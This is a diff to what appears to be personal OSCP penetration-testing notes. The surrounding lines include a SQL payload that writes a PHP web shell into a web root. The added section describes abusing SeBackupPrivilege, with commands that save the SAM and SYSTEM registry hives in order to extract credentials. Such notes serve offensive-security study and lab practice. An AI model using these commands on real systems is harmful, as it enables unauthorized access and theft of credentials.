@@ -782,7 +782,6 @@ SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
 ```
 
 
-
 ## Windows PrivEsc:
 
 Automation:
@@ -921,6 +920,17 @@ PS C:\xampp\htdocs\uploads> $object = [Activator]::CreateInstance($type)
 ![image](https://github.com/kullaisec/OSCP/assets/99985908/a22879da-2099-4290-8359-a96a38fc4f12)
 
 you can see we got the adminsitrator access !!
+
+### SeBackupPrivilege
+
+Reference: https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
+
+```powershell
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+```
 
 
 ### Installed Applications x64 and x86
